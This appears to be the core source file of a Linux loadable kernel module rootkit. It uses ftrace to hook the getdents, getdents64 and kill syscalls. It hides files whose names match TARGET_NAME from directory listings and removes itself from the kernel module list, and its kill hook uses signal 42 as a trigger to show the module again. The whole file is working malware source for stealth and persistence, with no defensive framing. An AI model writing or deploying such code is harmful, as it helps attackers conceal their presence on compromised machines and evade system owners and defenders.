#include <linux/syscalls.h>
#include <linux/dirent.h>

#include "hook.h"
#include "ftrace_helper.h"

struct list_head *prev_module;

asmlinkage long (*orig_getdents64)(const struct pt_regs *);
asmlinkage long (*orig_getdents)(const struct pt_regs *);
asmlinkage long (*orig_kill)(const struct pt_regs *);

asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    long error;

    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

	if ( (strncmp(current_dir->d_name, TARGET_NAME, strlen(TARGET_NAME)) == 0) )
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;
}

asmlinkage int hook_getdents(const struct pt_regs *regs)
{
    struct linux_dirent
    {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;

    long error;

    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;
        
	if ( (strncmp(current_dir->d_name, TARGET_NAME, strlen(TARGET_NAME)) == 0) )
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;

}

asmlinkage int hook_kill(const struct pt_regs *regs)
{
    pid_t pid = regs->di;
    int sig = regs->si;

    switch (sig)
    {
        case 42:
            list_add(&THIS_MODULE->list, prev_module);
            printk(KERN_INFO "rootkit: module shown\n");
            break;
        default:
            break;
    }

    return orig_kill(regs);
}

struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

int init_hooks(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
    {
        printk(KERN_ERR "rootkit: failed to install hooks\n");
        return err;
    }

    printk(KERN_INFO "rootkit: hooks installed\n");
    
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    
    printk(KERN_INFO "rootkit: module hidden\n");
    return err;
}

void remove_hooks(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
